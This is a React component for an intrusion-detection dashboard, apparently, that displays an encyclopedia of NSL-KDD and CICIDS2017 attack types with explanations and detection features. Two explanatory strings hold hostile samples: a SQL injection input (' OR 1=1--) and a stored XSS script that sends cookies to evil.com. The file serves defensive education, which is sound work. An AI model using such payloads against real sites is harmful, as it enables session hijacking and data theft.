import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Zap, Radar, Key, Crown, ShieldCheck,
  ChevronDown, AlertTriangle, Clock, Target, Wrench, Info,
  Globe, Bug, Lock, Database, Code
} from 'lucide-react'
import { CATEGORY_COLORS, CICIDS_COLORS } from '../lib/colors'
import { useReady } from '../lib/readyContext'
import { useModel } from '../lib/modelContext'

// ── NSL-KDD attack definitions ────────────────────────────────────────────────
const KDD_ATTACKS = [
  {
    key: 'Normal', icon: ShieldCheck, color: CATEGORY_COLORS.Normal,
    label: 'Normal Traffic', severity: 'Safe', severityColor: CATEGORY_COLORS.Normal,
    short: 'Legitimate network communication with no malicious intent.',
    what: 'Normal traffic represents standard, expected network behaviour — HTTP requests, DNS queries, file transfers, email, and other everyday protocols operating within normal parameters.',
    how: 'Normal traffic is identified by consistent patterns: appropriate packet sizes, standard port usage, expected connection durations, and low error rates. The model learns these baselines from 67,343 normal samples in the NSL-KDD dataset.',
    impact: 'No impact. These are safe connections that should be allowed through without interruption.',
    examples: ['HTTP web browsing', 'DNS name resolution', 'HTTPS encrypted traffic', 'FTP file transfers', 'SMTP email delivery'],
    realWorld: 'Every connection you make when visiting a website, sending an email, or downloading a file.',
    features: ['Low serror_rate', 'Normal src_bytes / dst_bytes ratio', 'logged_in = 1 for authenticated sessions'],
    dataset: 'NSL-KDD',
  },
  {
    key: 'DoS', icon: Zap, color: CATEGORY_COLORS.DoS,
    label: 'DoS — Denial of Service', severity: 'Critical', severityColor: CATEGORY_COLORS.DoS,
    short: 'Overwhelms a target system with traffic to make it unavailable to legitimate users.',
    what: 'DoS attacks flood a target server or network with an overwhelming volume of requests, exhausting its resources (bandwidth, memory, CPU) so it can no longer serve legitimate users. NSL-KDD includes 10 DoS subtypes covering different flooding techniques.',
    how: 'Attackers exploit protocol weaknesses to generate massive traffic with minimal effort. The "neptune" attack sends SYN packets without completing the TCP handshake, filling the connection table. "Smurf" amplifies traffic by broadcasting ICMP requests with a spoofed source IP.',
    impact: 'Service unavailability ranging from minutes to days. Cost: $20,000–$50,000 per hour of downtime for enterprises.',
    examples: ['Neptune — SYN flood (TCP handshake exhaustion)', 'Smurf — ICMP broadcast amplification', 'Teardrop — malformed fragmented packets', 'Back — Apache server exploit', 'Pod — oversized ICMP ping packets'],
    realWorld: 'GitHub suffered a 1.35 Tbps DDoS in 2018. Cloudflare blocked a 71 million RPS attack in 2023.',
    features: ['Very high serror_rate', 'Large count / srv_count', 'dst_host_serror_rate near 1.0', 'src_bytes near 0'],
    dataset: 'NSL-KDD',
  },
  {
    key: 'Probe', icon: Radar, color: CATEGORY_COLORS.Probe,
    label: 'Probe — Surveillance & Scanning', severity: 'High', severityColor: CATEGORY_COLORS.Probe,
    short: 'Systematically scans a network to discover hosts, open ports, and vulnerabilities.',
    what: 'Probe attacks are reconnaissance activities where an attacker maps the target network before launching a full attack. They are often the first stage of a multi-step intrusion.',
    how: 'Port scanners like nmap send packets to every port on a host to see which respond. IP sweepers (ipsweep) ping every IP in a subnet. Satan and saint are automated vulnerability scanners that probe for known software weaknesses.',
    impact: 'Direct impact is low — scanning itself does not damage systems. However, it is a strong indicator of an imminent attack and gives attackers a detailed map of your infrastructure.',
    examples: ['nmap — port scanning with fingerprinting', 'ipsweep — ping sweep across IP ranges', 'portsweep — scan one port across many IPs', 'Satan — automated vulnerability scanner', 'Mscan — mass network scanner'],
    realWorld: 'Most major breaches (Target 2013, Equifax 2017) were preceded by weeks of undetected reconnaissance scanning.',
    features: ['Moderate serror_rate', 'High dst_host_count', 'Low same_srv_rate', 'Varying dst_host_diff_srv_rate'],
    dataset: 'NSL-KDD',
  },
  {
    key: 'R2L', icon: Key, color: CATEGORY_COLORS.R2L,
    label: 'R2L — Remote to Local', severity: 'High', severityColor: CATEGORY_COLORS.R2L,
    short: 'An external attacker gains unauthorized local access to a machine they have no account on.',
    what: 'R2L attacks exploit vulnerabilities to gain user-level access to a target machine from the network. Unlike DoS which disrupts, R2L gives the attacker a foothold inside the network.',
    how: 'Common techniques include brute-forcing weak passwords (guess_passwd), exploiting misconfigured FTP servers (ftp_write), abusing email server vulnerabilities (imap, sendmail), and exploiting SNMP misconfigurations.',
    impact: 'Unauthorized access to sensitive data, ability to install malware, and potential data exfiltration.',
    examples: ['guess_passwd — brute force password attacks', 'ftp_write — unauthorized FTP file write', 'imap — IMAP exploit for email server access', 'snmpguess — SNMP community string brute force', 'warezmaster — FTP abuse'],
    realWorld: 'The 2021 Colonial Pipeline attack started with a compromised VPN password — a classic R2L entry point.',
    features: ['logged_in = 1 after compromise', 'Elevated num_failed_logins', 'dst_bytes > src_bytes', 'hot > 0'],
    dataset: 'NSL-KDD',
  },
  {
    key: 'U2R', icon: Crown, color: CATEGORY_COLORS.U2R,
    label: 'U2R — User to Root', severity: 'Critical', severityColor: CATEGORY_COLORS.U2R,
    short: 'A local user escalates privileges to gain root/administrator control of the system.',
    what: 'U2R is privilege escalation — the attacker already has a low-privilege local account and exploits a vulnerability to gain superuser (root/admin) access. Root access means complete control.',
    how: 'Buffer overflow attacks overwrite memory to inject malicious code with elevated privileges. Rootkits modify the kernel to hide the attacker\'s presence and maintain persistent access.',
    impact: 'Total system compromise — read any file, install keyloggers, disable security tools, pivot to other systems. Recovery often requires full OS reinstallation.',
    examples: ['buffer_overflow — memory corruption exploit', 'rootkit — kernel-level persistent backdoor', 'perl — Perl interpreter privilege exploit', 'sqlattack — SQL injection for DB admin access', 'xterm — X Window System exploit'],
    realWorld: 'The SolarWinds attack (2020) used U2R techniques to gain domain admin rights across 18,000 organizations.',
    features: ['root_shell = 1', 'su_attempted > 0', 'num_root > 0', 'num_file_creations > 0', 'num_shells > 0'],
    dataset: 'NSL-KDD',
  },
]

// ── CICIDS2017 attack definitions ─────────────────────────────────────────────
const CICIDS_ATTACKS = [
  {
    key: 'Benign', icon: ShieldCheck, color: CICIDS_COLORS.Benign,
    label: 'Benign Traffic', severity: 'Safe', severityColor: CICIDS_COLORS.Benign,
    short: 'Legitimate network traffic captured from real university network activity.',
    what: 'CICIDS2017 benign traffic was captured from a real university network over 5 days (Monday–Friday). It includes web browsing, email, FTP, SSH, VoIP, and other everyday protocols from 25 users following abstract behaviour profiles.',
    how: 'Identified by consistent patterns: normal flow durations, expected packet sizes, low idle times, and typical protocol sequences. The model learns from 2.27 million benign samples — the largest class by far.',
    impact: 'No impact. Legitimate traffic that must be allowed through without false positives.',
    examples: ['HTTPS web browsing sessions', 'SSH remote administration', 'FTP file transfers', 'SMTP/IMAP email', 'VoIP calls'],
    realWorld: 'Standard enterprise or university network traffic throughout a normal working week.',
    features: ['Normal Idle Mean / Idle Max', 'Consistent Bwd Packet Length', 'Low PSH Flag Count', 'Standard Flow Bytes/s'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'DoS', icon: Zap, color: CICIDS_COLORS.DoS,
    label: 'DoS — Denial of Service', severity: 'Critical', severityColor: CICIDS_COLORS.DoS,
    short: 'Application-layer attacks that exhaust server resources to deny legitimate service.',
    what: 'CICIDS2017 DoS attacks are application-layer (Layer 7) attacks unlike the network-layer floods in NSL-KDD. Tools like Slowloris, HULK, GoldenEye, and SlowHTTPTest target web servers by keeping connections open, exhausting connection pools and memory.',
    how: 'Slowloris sends partial HTTP headers very slowly, keeping server threads occupied without completing requests. HULK generates unique URLs to bypass caching. GoldenEye abuses HTTP keep-alive and cache-control headers.',
    impact: 'Web server unavailability, connection pool exhaustion, memory leaks, and CPU spikes — often with very low bandwidth usage making them hard to detect with simple traffic volume thresholds.',
    examples: ['Slowloris — partial HTTP header flood', 'HULK — unique URL HTTP flood', 'GoldenEye — keep-alive connection exhaustion', 'SlowHTTPTest — slow body POST flood', 'DoS Hulk — high-rate HTTP request flood'],
    realWorld: 'Slowloris was used to take down Iranian government sites during the 2009 Green Revolution protests.',
    features: ['High Idle Mean/Max (slow connections)', 'Elevated Bwd Packet Length Std', 'Low Fwd Packet Length Mean', 'Persistent long flow durations'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'DDoS', icon: Globe, color: CICIDS_COLORS.DDoS,
    label: 'DDoS — Distributed Denial of Service', severity: 'Critical', severityColor: CICIDS_COLORS.DDoS,
    short: 'Coordinated flood from multiple sources to overwhelm network bandwidth and infrastructure.',
    what: 'DDoS attacks in CICIDS2017 are volumetric network-layer floods using LOIC (Low Orbit Ion Cannon) — a tool typically operated by botnets or coordinated groups. Unlike single-source DoS, DDoS is much harder to block because traffic comes from thousands of IPs.',
    how: 'LOIC floods UDP or TCP packets at maximum rate to saturate the target\'s network interface or upstream bandwidth. In CICIDS2017, this generates high Bwd Packets/s and very large Flow Bytes/s that saturate network links.',
    impact: 'Complete network link saturation, upstream ISP congestion, collateral damage to co-hosted services. Mitigation typically requires anycast routing or scrubbing centres.',
    examples: ['LOIC UDP flood — high-volume UDP packet storm', 'LOIC TCP flood — SYN/ACK flood from botnet', 'HTTP DDoS — coordinated GET flood', 'Amplification — DNS/NTP reflection attacks'],
    realWorld: 'Mirai botnet DDoS (2016) took down Dyn DNS, making Twitter, Netflix, and GitHub inaccessible across the US East Coast.',
    features: ['Very high Bwd Packets/s', 'High Flow Bytes/s', 'Large Total Length of Fwd Packets', 'Elevated Packet Length Variance'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'PortScan', icon: Radar, color: CICIDS_COLORS.PortScan,
    label: 'PortScan — Network Reconnaissance', severity: 'Medium', severityColor: CICIDS_COLORS.PortScan,
    short: 'Systematically probes ports across hosts to map open services and vulnerabilities.',
    what: 'Port scanning in CICIDS2017 uses nmap to perform systematic reconnaissance of target hosts. This is equivalent to the Probe category in NSL-KDD but captured with modern tools and real network traffic, providing richer flow features.',
    how: 'nmap sends crafted packets (SYN, UDP, NULL, FIN, XMAS) to each port. The response (or lack thereof) reveals whether a port is open, closed, or filtered. Version detection sends additional probes to identify service versions and OS fingerprints.',
    impact: 'No direct damage — but provides attackers with a complete inventory of your attack surface. All major intrusion kill chains start with scanning.',
    examples: ['nmap SYN scan — stealth half-open scan', 'nmap aggressive scan — OS/version detection', 'UDP scan — find open UDP services', 'nmap scriptScan — vulnerability detection', 'Masscan — ultra-fast internet-wide scan'],
    realWorld: 'Shodan indexes open ports across the entire internet continuously — essentially a global permanent port scan.',
    features: ['Subflow Fwd Bytes near 0', 'Short flow duration', 'High Bwd Packets/s per host', 'Low Average Packet Size'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'BruteForce', icon: Lock, color: CICIDS_COLORS.BruteForce,
    label: 'BruteForce — Credential Attacks', severity: 'High', severityColor: CICIDS_COLORS.BruteForce,
    short: 'Systematically tries username/password combinations to gain unauthorized access.',
    what: 'CICIDS2017 BruteForce attacks target FTP (Patator tool) and SSH (Hydra tool) services. The attacker tries thousands or millions of credential combinations until finding valid ones.',
    how: 'Patator sends FTP AUTH commands in rapid succession. Hydra does the same for SSH. Each failed attempt generates a short connection with an immediate disconnect. The model identifies these by the rapid sequence of short flows with authentication failures.',
    impact: 'Credential compromise leading to unauthorized access. Once a valid password is found, the attacker has persistent access to the service and can pivot deeper into the network.',
    examples: ['FTP-Patator — FTP credential brute force', 'SSH-Hydra — SSH password spray', 'HTTP brute force — web login attacks', 'RDP brute force — Remote Desktop attacks', 'Telnet brute force — legacy service attacks'],
    realWorld: '80% of hacking-related breaches use stolen or brute-forced passwords (Verizon DBIR 2023).',
    features: ['Short Flow Duration', 'High act_data_pkt_fwd', 'Repeated SYN packets', 'Low Subflow Fwd Bytes per connection'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'Bot', icon: Bug, color: CICIDS_COLORS.Bot,
    label: 'Bot — Botnet Activity', severity: 'High', severityColor: CICIDS_COLORS.Bot,
    short: 'Compromised machines communicating with command-and-control servers for coordinated malicious activity.',
    what: 'Botnet traffic in CICIDS2017 was generated using the ARES botnet. Infected machines periodically beacon to C&C servers, receive instructions, and may perform tasks like sending spam, participating in DDoS, or exfiltrating data.',
    how: 'ARES bots make regular HTTP requests to C&C servers at fixed or jittered intervals. The traffic pattern has characteristic timing regularity and specific user-agent strings. CICIDS2017 captures both C&C beacon traffic and bot-to-bot propagation.',
    impact: 'Persistent compromise used as a platform for further attacks. Bot-infected machines waste resources, may be used for DDoS, crypto-mining, spam campaigns, or credential theft.',
    examples: ['ARES C&C beacon — periodic check-in to command server', 'Bot propagation — spreading to new hosts', 'Spam relay — sending bulk email', 'Click fraud — automated ad clicking', 'Crypto mining — using victim CPU for mining'],
    realWorld: 'The Emotet botnet infected millions of PCs globally before being taken down by Europol in 2021.',
    features: ['Regular Idle Mean patterns', 'Consistent Bwd Packet Length Mean', 'Periodic flow intervals', 'Specific Average Packet Size signatures'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'Infiltration', icon: Key, color: CICIDS_COLORS.Infiltration,
    label: 'Infiltration — Advanced Persistent Intrusion', severity: 'Critical', severityColor: CICIDS_COLORS.Infiltration,
    short: 'Multi-stage attack where a threat actor establishes a foothold and moves laterally through the network.',
    what: 'Infiltration in CICIDS2017 models a realistic APT (Advanced Persistent Threat) scenario: an attacker exploits a vulnerability in Dropbox/Word, gains access, installs a backdoor (Portscan using nmap + Metasploit), and then moves laterally.',
    how: 'The attack chain: phishing email with malicious attachment → victim opens it → Cool disk malware installs → C&C connection established → nmap scan for lateral movement → Metasploit Meterpreter session → data exfiltration.',
    impact: 'Extremely severe — complete internal network access, potential data theft, lateral movement to critical systems, persistent presence that can last months without detection.',
    examples: ['Exploit via malicious Word/PDF document', 'Cool disk backdoor installation', 'Internal network scan post-compromise', 'Meterpreter reverse shell session', 'Lateral movement to internal servers'],
    realWorld: 'The 2020 SolarWinds Orion supply chain attack used exactly this pattern — staying undetected for 9+ months.',
    features: ['Unusual internal traffic patterns', 'Meterpreter flow characteristics', 'Irregular Idle Max spikes', 'Mixed benign/malicious flow interleaving'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'Web Attack \uFFFD Brute Force', icon: Code, color: CICIDS_COLORS['Web Attack \uFFFD Brute Force'],
    label: 'Web Attack — Brute Force', severity: 'High', severityColor: CICIDS_COLORS['Web Attack \uFFFD Brute Force'],
    short: 'HTTP-level credential attacks against web application login forms.',
    what: 'Web brute force attacks target HTTP login forms directly using tools like DVWA (Damn Vulnerable Web Application). Unlike SSH/FTP brute force, these attacks go through the web application layer and may include CSRF token handling and cookie management.',
    how: 'The attacker submits thousands of POST requests to a login endpoint with different username/password combinations. Tools handle session cookies and CSRF tokens automatically. Each failed login returns a recognizable HTTP response that the tool uses to detect failure vs success.',
    impact: 'Account takeover, unauthorized access to web application data, potential for privilege escalation within the web app if admin credentials are found.',
    examples: ['DVWA HTTP login brute force', 'WordPress xmlrpc brute force', 'HTTP form POST credential spray', 'OWA/Exchange web brute force', 'Captcha bypass brute force'],
    realWorld: 'Over 2.5 billion credential stuffing attacks hit web applications daily (Akamai 2022).',
    features: ['Repetitive POST requests to same URL', 'High PSH Flag Count', 'Consistent Fwd Packet Length', 'Short flow durations with HTTP 200/401 responses'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'Web Attack \uFFFD Sql Injection', icon: Database, color: CICIDS_COLORS['Web Attack \uFFFD Sql Injection'],
    label: 'Web Attack — SQL Injection', severity: 'Critical', severityColor: CICIDS_COLORS['Web Attack \uFFFD Sql Injection'],
    short: 'Injecting malicious SQL code into web application inputs to manipulate database queries.',
    what: 'SQL injection attacks in CICIDS2017 were generated against DVWA using automated tools. The attacker sends crafted HTTP requests containing SQL metacharacters (quotes, semicolons, UNION statements) that break out of the intended query context.',
    how: 'A vulnerable query like `SELECT * FROM users WHERE name=\'$input\'` becomes `SELECT * FROM users WHERE name=\'\' OR 1=1--\'` when the attacker injects `\' OR 1=1--`. This returns all users. Blind SQLi uses timing delays or boolean responses to infer data without direct output.',
    impact: 'Complete database compromise: extract all user credentials, personally identifiable information, financial data. In some cases, write to the filesystem or execute OS commands (via xp_cmdshell on MSSQL).',
    examples: ['Classic SQL injection — UNION-based data extraction', 'Blind boolean SQL injection', 'Time-based blind injection', 'Error-based SQL injection', 'Stacked query injection'],
    realWorld: 'SQL injection caused the 2009 Heartland Payment breach (130M card numbers) — the largest payment card breach ever.',
    features: ['Unusual HTTP payload sizes', 'Slow response times (time-based)', 'Multiple GET/POST parameters', 'Specific Fwd Packet Length patterns'],
    dataset: 'CICIDS2017',
  },
  {
    key: 'Web Attack \uFFFD XSS', icon: Code, color: CICIDS_COLORS['Web Attack \uFFFD XSS'],
    label: 'Web Attack — XSS (Cross-Site Scripting)', severity: 'High', severityColor: CICIDS_COLORS['Web Attack \uFFFD XSS'],
    short: 'Injecting malicious scripts into web pages viewed by other users to steal data or hijack sessions.',
    what: 'XSS attacks inject JavaScript into web pages that other users view. When a victim loads the page, their browser executes the injected script in the context of the trusted website, giving the attacker access to cookies, session tokens, and page content.',
    how: 'Stored XSS: attacker posts `<script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>` as a comment. Every user who views the comment triggers the script and their session cookie is sent to the attacker.',
    impact: 'Session hijacking (stealing authentication cookies), account takeover, keylogging, redirecting users to phishing pages, defacement, and malware distribution.',
    examples: ['Stored XSS — persistent script in database', 'Reflected XSS — script in URL parameters', 'DOM-based XSS — client-side script injection', 'BeEF hook — browser exploitation framework', 'Cookie theft via document.cookie'],
    realWorld: 'The 2005 Samy worm spread across MySpace via XSS, infecting 1 million profiles in 20 hours.',
    features: ['Specific HTTP request patterns with <script> payloads', 'Bwd Packet Length indicating error or redirect responses', 'Multiple short flows to same endpoint', 'Elevated Bwd Header Length'],
    dataset: 'CICIDS2017',
  },
]

// ── Shared sub-components ─────────────────────────────────────────────────────

function SeverityBadge({ label, color }) {
  return (
    <span style={{
      fontSize: 10, fontWeight: 700, letterSpacing: '0.06em',
      color, background: `${color}15`,
      border: `1px solid ${color}30`,
      borderRadius: 4, padding: '2px 8px',
      textTransform: 'uppercase',
    }}>
      {label}
    </span>
  )
}

function InfoBlock({ icon: Icon, color, title, children }) {
  return (
    <div style={{
      background: '#111', border: '1px solid #1a1a1a',
      borderRadius: 8, padding: '12px 14px',
    }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 8 }}>
        <Icon size={12} color={color} />
        <span style={{ fontSize: 11, fontWeight: 600, color: '#555', letterSpacing: '0.04em', textTransform: 'uppercase' }}>{title}</span>
      </div>
      {children}
    </div>
  )
}

function AttackCard({ attack, index }) {
  const [open, setOpen] = useState(false)
  const ready = useReady()
  const Icon  = attack.icon

  return (
    <motion.div
      initial={{ opacity: 0, y: 14 }}
      animate={ready ? { opacity: 1, y: 0 } : { opacity: 0, y: 14 }}
      transition={{ duration: 0.35, delay: 0.05 + index * 0.06 }}
      style={{
        background: '#161616',
        border: `1px solid ${open ? attack.color + '30' : '#1f1f1f'}`,
        borderRadius: 10, overflow: 'hidden',
        transition: 'border-color 0.2s',
      }}
    >
      {/* Header row */}
      <motion.div
        onClick={() => setOpen(o => !o)}
        whileHover={{ background: '#1a1a1a' }}
        style={{
          display: 'flex', alignItems: 'center', gap: 14,
          padding: '16px 18px', cursor: 'pointer',
        }}
      >
        <div style={{
          width: 38, height: 38, borderRadius: 8, flexShrink: 0,
          background: `${attack.color}12`, border: `1px solid ${attack.color}25`,
          display: 'flex', alignItems: 'center', justifyContent: 'center',
        }}>
          <Icon size={18} color={attack.color} />
        </div>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 3 }}>
            <span style={{ fontSize: 14, fontWeight: 600, color: '#e2e2e2' }}>{attack.label}</span>
            <SeverityBadge label={attack.severity} color={attack.severityColor} />
          </div>
          <p style={{ fontSize: 12, color: '#555', margin: 0, lineHeight: 1.4 }}>{attack.short}</p>
        </div>
        <motion.div animate={{ rotate: open ? 180 : 0 }} transition={{ duration: 0.2 }} style={{ flexShrink: 0 }}>
          <ChevronDown size={16} color="#444" />
        </motion.div>
      </motion.div>

      {/* Expanded content */}
      <AnimatePresence initial={false}>
        {open && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.3, ease: 'easeInOut' }}
            style={{ overflow: 'hidden' }}
          >
            <div style={{ padding: '0 18px 20px', borderTop: `1px solid ${attack.color}18` }}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginTop: 16 }}>
                <InfoBlock icon={Info} color="#3b82f6" title="What is it?">
                  <p style={{ fontSize: 12, color: '#666', lineHeight: 1.7, margin: 0 }}>{attack.what}</p>
                </InfoBlock>
                <InfoBlock icon={Wrench} color={attack.color} title="How it works">
                  <p style={{ fontSize: 12, color: '#666', lineHeight: 1.7, margin: 0 }}>{attack.how}</p>
                </InfoBlock>
                <InfoBlock icon={AlertTriangle} color={attack.severityColor} title="Impact">
                  <p style={{ fontSize: 12, color: '#666', lineHeight: 1.7, margin: 0 }}>{attack.impact}</p>
                </InfoBlock>
                <InfoBlock icon={Clock} color="#888" title="Real-world example">
                  <p style={{ fontSize: 12, color: '#666', lineHeight: 1.7, margin: 0 }}>{attack.realWorld}</p>
                </InfoBlock>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginTop: 16 }}>
                <InfoBlock icon={Target} color={attack.color} title="Known subtypes / examples">
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 5, marginTop: 2 }}>
                    {attack.examples.map((ex, i) => (
                      <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 7 }}>
                        <span style={{ width: 4, height: 4, borderRadius: '50%', background: attack.color, marginTop: 5, flexShrink: 0 }} />
                        <span style={{ fontSize: 12, color: '#666' }}>{ex}</span>
                      </div>
                    ))}
                  </div>
                </InfoBlock>
                <InfoBlock icon={Radar} color="#3b82f6" title={`Key detection features (${attack.dataset})`}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 5, marginTop: 2 }}>
                    {attack.features.map((f, i) => (
                      <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 7 }}>
                        <span style={{ width: 4, height: 4, borderRadius: '50%', background: '#3b82f6', marginTop: 5, flexShrink: 0 }} />
                        <code style={{ fontSize: 11, color: '#3b82f6', background: 'rgba(59,130,246,0.08)', padding: '1px 6px', borderRadius: 3 }}>{f}</code>
                      </div>
                    ))}
                  </div>
                </InfoBlock>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

// ── Main export ───────────────────────────────────────────────────────────────

export default function AttackInfo({ standalone = false }) {
  const [expanded, setExpanded] = useState(!standalone ? false : true)
  const ready                   = useReady()
  const { activeModel }         = useModel()

  const attacks = activeModel === 'cicids' ? CICIDS_ATTACKS : KDD_ATTACKS

  if (standalone) {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {attacks.map((a, i) => (
          <AttackCard key={a.key} attack={a} index={i} />
        ))}
      </div>
    )
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 14 }}
      animate={ready ? { opacity: 1, y: 0 } : { opacity: 0, y: 14 }}
      transition={{ duration: 0.4, delay: 0.6 }}
      style={{ marginTop: 12 }}
    >
      <motion.div
        onClick={() => setExpanded(o => !o)}
        whileHover={{ background: '#161616' }}
        style={{
          display: 'flex', alignItems: 'center', gap: 10,
          background: '#141414', border: '1px solid #1f1f1f',
          borderRadius: expanded ? '10px 10px 0 0' : 10,
          padding: '14px 18px', cursor: 'pointer',
        }}
      >
        <Info size={15} color="#3b82f6" />
        <span style={{ fontSize: 13, fontWeight: 600, color: '#ccc', flex: 1 }}>Attack Type Encyclopedia</span>
        <span style={{ fontSize: 11, color: '#444', marginRight: 8 }}>
          {attacks.length} categories · {activeModel === 'cicids' ? 'CICIDS2017' : 'NSL-KDD'}
        </span>
        <motion.div animate={{ rotate: expanded ? 180 : 0 }} transition={{ duration: 0.2 }}>
          <ChevronDown size={15} color="#444" />
        </motion.div>
      </motion.div>

      <AnimatePresence initial={false}>
        {expanded && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.35, ease: 'easeInOut' }}
            style={{
              overflow: 'hidden', background: '#111',
              border: '1px solid #1f1f1f', borderTop: 'none',
              borderRadius: '0 0 10px 10px', padding: '14px',
            }}
          >
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
              {attacks.map((a, i) => (
                <AttackCard key={a.key} attack={a} index={i} />
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}
